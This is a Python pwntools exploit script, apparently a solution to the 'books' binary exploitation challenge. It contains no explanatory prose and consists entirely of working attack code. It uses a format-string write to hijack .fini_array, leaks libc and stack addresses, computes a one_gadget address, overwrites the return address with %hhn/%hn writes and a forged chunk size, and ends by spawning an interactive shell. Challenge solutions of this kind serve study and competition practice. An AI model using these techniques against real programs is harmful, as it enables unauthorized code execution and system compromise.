from pwn import *

p = process('./books')
context.log_level = 'debug'
elf = ELF('./books')
libc = ELF('libc.so')

def edit1(content) :
    sleep(0.1)
    p.sendline('1')
    p.recvuntil('Enter first order:\n')
    p.sendline(content)

def edit2(content) :
    sleep(0.1)
    p.sendline('2')
    p.recvuntil('Enter second order:\n')
    p.sendline(content)

def delete1() :
    sleep(0.1)
    p.sendline('3')

def delete2() :
    sleep(0.1)
    p.sendline('4')

def submit() :
    sleep(0.1)
    p.sendline('5')

free_got = elf.got['free']
fini_array = 0x6011B8
main_addr = 0x400A39

delete2()

payload = "%"+str(2617)+"c%13$hn"  + '.%31$p' + ',%28$p'
payload += 'A'*(0x74-len(payload))
payload += p8(0x0)*(0x88-len(payload))
payload += p64(0x151)
edit1(payload)

payload2 = '5'+p8(0x0)*7 + p64(fini_array)
p.sendline(payload2)

#leak --> libc_base
p.recvuntil('\x2e')
p.recvuntil('\x2e')
p.recvuntil('\x2e')
data = p.recv(14)
p.recvuntil(',')
ret_addr = p.recv(14)
data = int(data,16) - 240
ret_addr = int(ret_addr,16) + 0x28 - 0x210
libc_base = data - libc.symbols['__libc_start_main']
log.success('ret_addr :'+hex(ret_addr))

#repeat --> change ret_addr --> system_addr(one_gadget)
one_shot = libc_base + 0x45216
print hex(one_shot)
one_shot1 = '0x'+str(hex(one_shot))[-2:]
one_shot2 = '0x'+str(hex(one_shot))[-6:-2]
print one_shot1,one_shot2
one_shot1 = int(one_shot1,16)
one_shot2 = int(one_shot2,16)

delete2()

payload3 = "%" + str(one_shot1) + "d%13$hhn"
payload3 += '%' + str(one_shot2-one_shot1) + 'd%14$hn'
payload3 += 'A'*(0x74-len(payload3))
payload3 += p8(0x0)*(0x88-len(payload3))
payload3 += p64(0x151)
edit1(payload3)

payload4 = '5' + p8(0x0)*7 + p64(ret_addr) + p64(ret_addr+1)
p.sendline(payload4)

p.interactive()
